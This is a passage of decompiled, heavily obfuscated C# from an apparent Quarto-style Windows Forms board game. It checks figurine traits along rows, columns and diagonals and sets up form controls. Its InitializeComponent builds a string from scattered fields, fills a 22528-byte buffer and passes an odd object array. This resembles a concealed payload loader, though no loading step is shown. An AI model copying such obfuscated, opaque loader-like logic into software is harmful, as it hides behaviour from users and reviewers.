						num = ((int)num2 * -2021015326) ^ -1015321739;
						continue;
					}
					goto IL_0126;
				case 70u:
					num5++;
					num = ((int)num2 * -946422273) ^ -741608836;
					continue;
				case 69u:
				{
					int num60;
					int num61;
					if (mem[num5, 1].Point == mem[num5, 2].Point)
					{
						num60 = 814830749;
						num61 = 814830749;
					}
					else
					{
						num60 = 2027493395;
						num61 = 2027493395;
					}
					num = num60 ^ (int)(num2 * 316430181);
					continue;
				}
				case 68u:
					if (mem[2, 1] != null)
					{
						num = (int)(num2 * 931402349) ^ -634005115;
						continue;
					}
					goto IL_01a7;
				case 66u:
					flag = true;
					num = (int)(num2 * 2123279891) ^ -1473751517;
					continue;
				case 65u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1864193294) ^ -1796189884;
						continue;
					}
					goto IL_01f8;
				case 64u:
				{
					int num23;
					int num24;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num23 = 1754189796;
						num24 = 1754189796;
					}
					else
					{
						num23 = 1563284297;
						num24 = 1563284297;
					}
					num = num23 ^ (int)(num2 * 1821569130);
					continue;
				}
				case 63u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -839150853) ^ 0x1DC81017;
						continue;
					}
					goto IL_026b;
				case 62u:
				{
					int num68;
					int num69;
					if (!flag3)
					{
						num68 = 913363552;
						num69 = 913363552;
					}
					else
					{
						num68 = 1747055685;
						num69 = 1747055685;
					}
					num = num68 ^ (int)(num2 * 1466899924);
					continue;
				}
				case 61u:
				{
					int num58;
					int num59;
					if (mem[num5, 2] == null)
					{
						num58 = -2003083471;
						num59 = -2003083471;
					}
					else
					{
						num58 = -1754947577;
						num59 = -1754947577;
					}
					num = num58 ^ ((int)num2 * -1261696954);
					continue;
				}
				case 60u:
				{
					int num54;
					int num55;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num54 = 923604572;
						num55 = 923604572;
					}
					else
					{
						num54 = 63336918;
						num55 = 63336918;
					}
					num = num54 ^ ((int)num2 * -1120266525);
					continue;
				}
				case 59u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 915124178) ^ -1440112303;
						continue;
					}
					goto IL_0338;
				case 58u:
				{
					int num41;
					int num42;
					if (mem[num5, 1] != null)
					{
						num41 = 1443441988;
						num42 = 1443441988;
					}
					else
					{
						num41 = 553651755;
						num42 = 553651755;
					}
					num = num41 ^ ((int)num2 * -388041803);
					continue;
				}
				case 57u:
				{
					int num31;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 1478491646;
						num31 = 1478491646;
					}
					else
					{
						num = 1536592585;
						num31 = 1536592585;
					}
					continue;
				}
				case 56u:
					flag = true;
					num = ((int)num2 * -806951382) ^ -1061954423;
					continue;
				case 55u:
					if (mem[3, num5] != null)
					{
						num = ((int)num2 * -292053530) ^ -893115;
						continue;
					}
					goto IL_0126;
				case 54u:
				{
					int num17;
					int num18;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num17 = 354735306;
						num18 = 354735306;
					}
					else
					{
						num17 = 1461082188;
						num18 = 1461082188;
					}
					num = num17 ^ ((int)num2 * -305786210);
					continue;
				}
				case 53u:
					num21 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_0127;
				case 52u:
					num = 1656788715;
					continue;
				case 51u:
				{
					int num8;
					int num9;
					if (mem[1, num5].Big != mem[2, num5].Big)
					{
						num8 = 905151007;
						num9 = 905151007;
					}
					else
					{
						num8 = 1544088066;
						num9 = 1544088066;
					}
					num = num8 ^ (int)(num2 * 827746256);
					continue;
				}
				case 50u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -2026368737) ^ 0x181EC965;
						continue;
					}
					goto IL_04b6;
				case 49u:
				{
					int num66;
					int num67;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num66 = 1951109847;
						num67 = 1951109847;
					}
					else
					{
						num66 = 1635546246;
						num67 = 1635546246;
					}
					num = num66 ^ ((int)num2 * -1454230735);
					continue;
				}
				case 48u:
				{
					int num62;
					int num63;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num62 = -1332617705;
						num63 = -1332617705;
					}
					else
					{
						num62 = -217570693;
						num63 = -217570693;
					}
					num = num62 ^ (int)(num2 * 2003672857);
					continue;
				}
				case 47u:
				{
					int num50;
					int num51;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num50 = -790483031;
						num51 = -790483031;
					}
					else
					{
						num50 = -1523371544;
						num51 = -1523371544;
					}
					num = num50 ^ ((int)num2 * -369598189);
					continue;
				}
				case 46u:
					result = flag;
					num = 587099024;
					continue;
				case 45u:
					flag3 = num5 < 4;
					num = 482137695;
					continue;
				case 44u:
				{
					int num45;
					int num46;
					if (mem[num5, 1].Square != mem[num5, 2].Square)
					{
						num45 = 1695071867;
						num46 = 1695071867;
					}
					else
					{
						num45 = 549203310;
						num46 = 549203310;
					}
					num = num45 ^ (int)(num2 * 41950087);
					continue;
				}
				case 43u:
					if (mem[0, 3] != null)
					{
						num = 366495739;
						continue;
					}
					goto IL_01a7;
				case 42u:
				{
					int num38;
					int num39;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num38 = -2016722538;
						num39 = -2016722538;
					}
					else
					{
						num38 = -926847529;
						num39 = -926847529;
					}
					num = num38 ^ (int)(num2 * 1936299250);
					continue;
				}
				case 41u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -692788939) ^ 0x2F0136B3;
						continue;
					}
					goto IL_0338;
				case 40u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1147807451) ^ 0x5C558EDA;
						continue;
					}
					goto IL_0695;
				case 39u:
				{
					int num29;
					int num30;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num29 = -1584416524;
						num30 = -1584416524;
					}
					else
					{
						num29 = -1360775122;
						num30 = -1360775122;
					}
					num = num29 ^ ((int)num2 * -1852390438);
					continue;
				}
				case 38u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 1319696874;
						continue;
					}
					goto IL_0702;
				case 37u:
				{
					int num22;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 1408763932;
						num22 = 1408763932;
					}
					else
					{
						num = 2006884396;
						num22 = 2006884396;
					}
					continue;
				}
				case 36u:
				{
					int num14;
					int num15;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num14 = 1903985637;
						num15 = 1903985637;
					}
					else
					{
						num14 = 2011980310;
						num15 = 2011980310;
					}
					num = num14 ^ (int)(num2 * 1072436935);
					continue;
				}
				case 35u:
				{
					int num11;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 143454611;
						num11 = 143454611;
					}
					else
					{
						num = 2032980408;
						num11 = 2032980408;
					}
					continue;
				}
				case 34u:
					if (mem[0, num5] != null)
					{
						num = 1266180458;
						continue;
					}
					goto IL_0126;
				case 33u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -1155548083) ^ -547146488;
						continue;
					}
					goto IL_04b6;
				case 32u:
					if (mem[2, num5] != null)
					{
						num = (int)(num2 * 1983958345) ^ -1296808430;
						continue;
					}
					goto IL_0126;
				case 31u:
				{
					int num71;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 274044839;
						num71 = 274044839;
					}
					else
					{
						num = 2060947253;
						num71 = 2060947253;
					}
					continue;
				}
				case 30u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)((num2 * 44169392) ^ 0x189A35EA);
						continue;
					}
					goto IL_0695;
				case 29u:
					num5 = 0;
					num = ((int)num2 * -1573972024) ^ -648170814;
					continue;
				case 28u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 1607831259) ^ 0x7F3E760E);
						continue;
					}
					goto IL_01a7;
				case 27u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -1716136978) ^ -1215592329;
						continue;
					}
					goto IL_0338;
				case 26u:
				{
					int num64;
					int num65;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num64 = 1505036999;
						num65 = 1505036999;
					}
					else
					{
						num64 = 1198650279;
						num65 = 1198650279;
					}
					num = num64 ^ ((int)num2 * -2106143354);
					continue;
				}
				case 25u:
				{
					int num56;
					int num57;
					if (mem[2, 2] != null)
					{
						num56 = 228996615;
						num57 = 228996615;
					}
					else
					{
						num56 = 1522442291;
						num57 = 1522442291;
					}
					num = num56 ^ (int)(num2 * 1393873183);
					continue;
				}
				case 24u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 1472858040) ^ 0x75DA88AA);
						continue;
					}
					goto IL_01f8;
				case 23u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -883714170) ^ -1730149594;
						continue;
					}
					goto IL_0702;
				case 22u:
				{
					int num49;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = 1674283377;
						num49 = 1674283377;
					}
					else
					{
						num = 1027163533;
						num49 = 1027163533;
					}
					continue;
				}
				case 21u:
				{
					int num47;
					int num48;
					if (!flag2)
					{
						num47 = -146838581;
						num48 = -146838581;
					}
					else
					{
						num47 = -246218323;
						num48 = -246218323;
					}
					num = num47 ^ (int)(num2 * 817922098);
					continue;
				}
				case 20u:
				{
					int num43;
					int num44;
					if (mem[num5, 0].Big != mem[num5, 1].Big)
					{
						num43 = -902920065;
						num44 = -902920065;
					}
					else
					{
						num43 = -1629121951;
						num44 = -1629121951;
					}
					num = num43 ^ (int)(num2 * 711678690);
					continue;
				}
				case 18u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 63860517) ^ 0x4A68147B);
						continue;
					}
					goto IL_01a7;
				case 17u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 471437796) ^ -2123431212;
						continue;
					}
					goto IL_0695;
				case 16u:
				{
					int num40;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 473687451;
						num40 = 473687451;
					}
					else
					{
						num = 1335028385;
						num40 = 1335028385;
					}
					continue;
				}
				case 15u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 404105572;
						continue;
					}
					goto IL_026b;
				case 14u:
					num = 448219350;
					continue;
				case 13u:
				{
					int num34;
					int num35;
					if (mem[0, 0] == null)
					{
						num34 = 2063887520;
						num35 = 2063887520;
					}
					else
					{
						num34 = 192035101;
						num35 = 192035101;
					}
					num = num34 ^ (int)(num2 * 1577635880);
					continue;
				}
				case 12u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -231897932) ^ 0x2F0707C;
						continue;
					}
					goto IL_01f8;
				case 11u:
					num19 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_01a8;
				case 10u:
				{
					int num32;
					int num33;
					if (mem[1, num5].Dark != mem[2, num5].Dark)
					{
						num32 = -1487276659;
						num33 = -1487276659;
					}
					else
					{
						num32 = -629877422;
						num33 = -629877422;
					}
					num = num32 ^ ((int)num2 * -2115872569);
					continue;
				}
				case 9u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -81493684) ^ -1085574840;
						continue;
					}
					goto IL_0695;
				case 8u:
				{
					int num27;
					int num28;
					if (mem[0, num5].Big != mem[1, num5].Big)
					{
						num27 = 132647201;
						num28 = 132647201;
					}
					else
					{
						num27 = 447636032;
						num28 = 447636032;
					}
					num = num27 ^ ((int)num2 * -1007570321);
					continue;
				}
				case 7u:
				{
					int num25;
					int num26;
					if (mem[3, 3] != null)
					{
						num25 = -1939894444;
						num26 = -1939894444;
					}
					else
					{
						num25 = -1865910221;
						num26 = -1865910221;
					}
					num = num25 ^ (int)(num2 * 1261685927);
					continue;
				}
				case 6u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -1893232264) ^ -1355109529;
						continue;
					}
					goto IL_0338;
				case 5u:
				{
					int num20;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 1199743130;
						num20 = 1199743130;
					}
					else
					{
						num = 903783440;
						num20 = 903783440;
					}
					continue;
				}
				case 4u:
				{
					int num16;
					if (mem[num5, 0].Dark == mem[num5, 1].Dark)
					{
						num = 1857032788;
						num16 = 1857032788;
					}
					else
					{
						num = 1746374877;
						num16 = 1746374877;
					}
					continue;
				}
				case 3u:
				{
					int num12;
					int num13;
					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num12 = 1798036407;
						num13 = 1798036407;
					}
					else
					{
						num12 = 1177361160;
						num13 = 1177361160;
					}
					num = num12 ^ ((int)num2 * -1290246494);
					continue;
				}
				case 2u:
				{
					int num10;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = 561938068;
						num10 = 561938068;
					}
					else
					{
						num = 210889738;
						num10 = 210889738;
					}
					continue;
				}
				case 1u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -2125756384) ^ 0xEC259ED;
						continue;
					}
					goto IL_04b6;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num3 = 1271855473;
						num4 = 1271855473;
					}
					else
					{
						num3 = 275376164;
						num4 = 275376164;
					}
					num = num3 ^ ((int)num2 * -1811545597);
					continue;
				}
				case 67u:
					break;
				default:
					{
						return result;
					}
					IL_026b:
					num19 = 0;
					goto IL_01a8;
					IL_0702:
					num21 = 0;
					goto IL_0127;
					IL_0127:
					flag2 = (byte)num21 != 0;
					num = 1306449522;
					continue;
					IL_0126:
					num21 = 0;
					goto IL_0127;
					IL_0695:
					num19 = 1;
					goto IL_01a8;
					IL_01f8:
					num19 = 1;
					goto IL_01a8;
					IL_0338:
					num21 = 1;
					goto IL_0127;
					IL_01a7:
					num19 = 0;
					goto IL_01a8;
					IL_01a8:
					flag4 = (byte)num19 != 0;
					num = 1550391310;
					continue;
					IL_04b6:
					num21 = 1;
					goto IL_0127;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag2 = default(bool);
		bool flag = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1953591906;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1069295u) % 14u)
				{
				case 13u:
					flag2 = false;
					num = ((int)num2 * -1327546598) ^ -1478818773;
					continue;
				case 12u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -168836454;
						num8 = -168836454;
					}
					else
					{
						num7 = -2033287557;
						num8 = -2033287557;
					}
					num = num7 ^ ((int)num2 * -2136966007);
					continue;
				}
				case 11u:
					num3 = 0;
					num = 168549507;
					continue;
				case 9u:
				{
					int num9;
					if (num4 < 4)
					{
						num = 1770168916;
						num9 = 1770168916;
					}
					else
					{
						num = 587466886;
						num9 = 587466886;
					}
					continue;
				}
				case 8u:
				{
					int num5;
					int num6;
					if (!flag3)
					{
						num5 = 266421143;
						num6 = 266421143;
					}
					else
					{
						num5 = 223169238;
						num6 = 223169238;
					}
					num = num5 ^ (int)(num2 * 5434715);
					continue;
				}
				case 7u:
					flag2 = true;
					num4 = 0;
					num = (int)((num2 * 518766888) ^ 0x3CFCF3D4);
					continue;
				case 6u:
					num4++;
					num = ((int)num2 * -384943701) ^ 0x48AA1F5E;
					continue;
				case 5u:
					flag3 = mem[num4, num3] == null;
					num = 1239602687;
					continue;
				case 3u:
					num = ((int)num2 * -1404187483) ^ 0x28C69313;
					continue;
				case 2u:
					num3++;
					num = 168549507;
					continue;
				case 1u:
					result = flag2;
					num = (int)(num2 * 1561134042) ^ -1010458581;
					continue;
				case 0u:
					flag = num3 < 4;
					num = 1496154491;
					continue;
				case 10u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -1756478517;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD658605Fu) % 9u)
				{
				case 8u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -532141465) ^ -1964768901;
					continue;
				case 7u:
					num = ((int)num2 * -1975106092) ^ -1782040732;
					continue;
				case 5u:
					num = ((int)num2 * -112680312) ^ -295803442;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)(num2 * 267102768) ^ -204617833;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)(num2 * 1238631879) ^ -566414403;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -1726875762) ^ 0x717E7965;
					continue;
				case 0u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -1104656799) ^ -263909053;
					continue;
				default:
					return;
				case 4u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0009;
		}
		int num = 0;
		goto IL_00b2;
		IL_00b2:
		bool flag = (byte)num != 0;
		int num2 = -1323288935;
		goto IL_0078;
		IL_0009:
		num2 = -879095253;
		goto IL_0078;
		IL_0078:
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0x9278989Cu) % 8u)
			{
			case 6u:
				break;
			case 5u:
			{
				int num4;
				int num5;
				if (flag)
				{
					num4 = -1143427659;
					num5 = -1143427659;
				}
				else
				{
					num4 = -305922975;
					num5 = -305922975;
				}
				num2 = num4 ^ ((int)num3 * -210235395);
				continue;
			}
			case 4u:
				((Form)this).Dispose(disposing);
				num2 = -1130377218;
				continue;
			case 3u:
				Form1.smethod_51((IDisposable)components);
				num2 = (int)((num3 * 453734307) ^ 0x19B58CA4);
				continue;
			case 1u:
				num2 = ((int)num3 * -193913163) ^ 0x3434A8F5;
				continue;
			case 0u:
				num2 = (int)(num3 * 292120486) ^ -1382042833;
				continue;
			default:
				return;
			case 7u:
				goto IL_00a9;
			case 2u:
				return;
			}
			break;
		}
		goto IL_0009;
		IL_00a9:
		num = ((components != null) ? 1 : 0);
		goto IL_00b2;
	}

	private void InitializeComponent()
	{
		//IL_0f84: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f8e: Expected O, but got Unknown
		string string_ = default(string);
		int num3 = default(int);
		object[] object_ = default(object[]);
		byte[] array = default(byte[]);
		bool flag = default(bool);
		while (true)
		{
			int num = -830213878;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD917EDE6u) % 133u)
				{
				case 132u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -1646676603) ^ 0x66B81CE1;
					continue;
				case 131u:
					num = ((int)num2 * -537980565) ^ -1162819125;
					continue;
				case 130u:
					num = ((int)num2 * -1257893884) ^ 0x651AD977;
					continue;
				case 129u:
					Form1.smethod_61((Control)(object)label5, "label5");
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)(num2 * 557327431) ^ -340561237;
					continue;
				case 128u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1840578496) ^ 0x46299CEB);
					continue;
				case 127u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 744450389) ^ 0x535DBFC4);
					continue;
				case 126u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1010575352) ^ 0x171AA8B6;
					continue;
				case 125u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -688806061) ^ 0xF6E4750;
					continue;
				case 124u:
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -545917923) ^ -160320372;
					continue;
				case 123u:
					num = ((int)num2 * -874554642) ^ 0x724C77F9;
					continue;
				case 122u:
					num = ((int)num2 * -1236033567) ^ 0xD184A12;
					continue;
				case 121u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -1153431363) ^ -2123992501;
					continue;
				case 120u:
					button1 = Form1.smethod_53();
					num = (int)((num2 * 695427436) ^ 0x44EAEB8E);
					continue;
				case 118u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -417763750) ^ 0x3B2AB0F1;
					continue;
				case 117u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1696677047) ^ 0x45B942F7;
					continue;
				case 116u:
					num = ((int)num2 * -677983186) ^ -1388898883;
					continue;
				case 115u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 1426744456) ^ -679312000;
					continue;
				case 114u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 65894367) ^ -2122540982;
					continue;
				case 113u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 658097049) ^ 0x720DDE80);
					continue;
				case 112u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)((num2 * 1806917689) ^ 0x58E7B95A);
					continue;
				case 111u:
					num = (int)((num2 * 893508059) ^ 0x622BD99E);
					continue;
				case 110u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 1271824654) ^ -1738814743;
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -716387671) ^ -1854026020;
					continue;
				case 108u:
					num = ((int)num2 * -1355746831) ^ 0x1DEA9A7F;
					continue;
				case 107u:
					num = (int)(num2 * 1683011922) ^ -539114693;
					continue;
				case 106u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 11358151) ^ -1013438062;
					continue;
				case 105u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 172599939) ^ 0x23658B1D);
					continue;
				case 104u:
					Form1.smethod_61((Control)(object)label2, "label2");
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1921807665) ^ 0x645572A8;
					continue;
				case 103u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)((num2 * 1007656642) ^ 0x5EF468CC);
					continue;
				case 102u:
					num = (int)(num2 * 345030574) ^ -262613076;
					continue;
				case 101u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1260226458) ^ -247542775;
					continue;
				case 100u:
					num = (int)((num2 * 533536123) ^ 0x63A3F255);
					continue;
				case 99u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 914690312) ^ 0x40094FBD);
					continue;
				case 98u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)(num2 * 1362852889) ^ -2139100034;
					continue;
				case 97u:
					num = ((int)num2 * -1636825006) ^ -1577362132;
					continue;
				case 96u:
					num = (int)((num2 * 1170091415) ^ 0x2A9F482D);
					continue;
				case 95u:
					num = (int)((num2 * 1184928710) ^ 0x3808908C);
					continue;
				case 94u:
					num = ((int)num2 * -1506008621) ^ 0x2B2E2726;
					continue;
				case 93u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 2127762488) ^ -1989675699;
					continue;
				case 92u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -271780924) ^ -446612764;
					continue;
				case 91u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 543473663) ^ -665074880;
					continue;
				case 90u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -443759820) ^ 0x498121B4;
					continue;
				case 89u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -548849377) ^ -1069733168;
					continue;
				case 88u:
					num = (int)(num2 * 1482728088) ^ -699280812;
					continue;
				case 87u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1756954417) ^ 0x6BF75AA6;
					continue;
				case 86u:
					num3 = 0;
					num = ((int)num2 * -383115534) ^ -1667234414;
					continue;
				case 85u:
					num = (int)(num2 * 332812214) ^ -1048264889;
					continue;
				case 84u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1384281953) ^ 0x60EBECC4;
					continue;
				case 83u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 258226915) ^ 0x7F2D8267);
					continue;
				case 82u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1926760697) ^ -1368245362;
					continue;
				case 81u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 2068979626) ^ 0x198CA7E5);
					continue;
				case 80u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 828018464) ^ 0x39D5881C);
					continue;
				case 79u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 910771509) ^ 0x4B6F8E);
					continue;
				case 78u:
					Form1.smethod_5((Control)(object)this, Color.White);
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 1163482643) ^ -1215123737;
					continue;
				case 77u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -1976146146) ^ 0x742197E9;
					continue;
				case 76u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -873485142) ^ -1282693221;
					continue;
				case 75u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 864417756) ^ -1424032103;
					continue;
				case 74u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 452104716) ^ -99884312;
					continue;
				case 73u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -232146118) ^ 0x55CCE86D;
					continue;
				case 72u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1497276813) ^ 0x619401D3;
					continue;
				case 71u:
					num = ((int)num2 * -1485597442) ^ 0x7CEE92B8;
					continue;
				case 70u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)((num2 * 380705495) ^ 0x7A4E3469);
					continue;
				case 69u:
					num = ((int)num2 * -1190595425) ^ -1870268075;
					continue;
				case 68u:
					num = (int)((num2 * 401836939) ^ 0xDC40164);
					continue;
				case 67u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					string_ = Veet.Sa;
					num = ((int)num2 * -1956430632) ^ -1142852697;
					continue;
				case 66u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 1019848434) ^ -1212921870;
					continue;
				case 65u:
					panel1 = Form1.smethod_55();
					num = (int)(num2 * 1663901245) ^ -593179847;
					continue;
				case 64u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 1805389229) ^ 0x11EBCD9A);
					continue;
				case 63u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)(num2 * 1658078531) ^ -758369486;
					continue;
				case 62u:
					num = (int)(num2 * 1255555137) ^ -1940645841;
					continue;
				case 61u:
					num = ((int)num2 * -1954250210) ^ 0x3EB16AF4;
					continue;
				case 60u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -792054333) ^ -649232247;
					continue;
				case 59u:
					array = new byte[22528];
					num = ((int)num2 * -1459438714) ^ 0xFA1485F;
					continue;
				case 58u:
					num = ((int)num2 * -107742172) ^ 0xD9A7E31;
					continue;
				case 57u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -2000866764) ^ 0x1321AE60;
					continue;
				case 56u:
					num3++;
					num = ((int)num2 * -1884923981) ^ 0x7623C6BF;
					continue;
				case 54u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -510466516) ^ 0x2FB447D6;
					continue;
				case 53u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -1646563194) ^ 0x4F8824E0;
					continue;
				case 52u:
					num = (int)(num2 * 1362205943) ^ -1731808168;
					continue;
				case 51u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1698828083) ^ -1608709809;
					continue;
				case 50u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 871368094) ^ -1916266134;
					continue;
				case 49u:
					flag = num3 < 22528;
					num = -1863442568;
					continue;
				case 48u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1263263582) ^ 0x3A21BEF;
					continue;
				case 47u:
					num = ((int)num2 * -431616587) ^ -859232569;
					continue;
				case 46u:
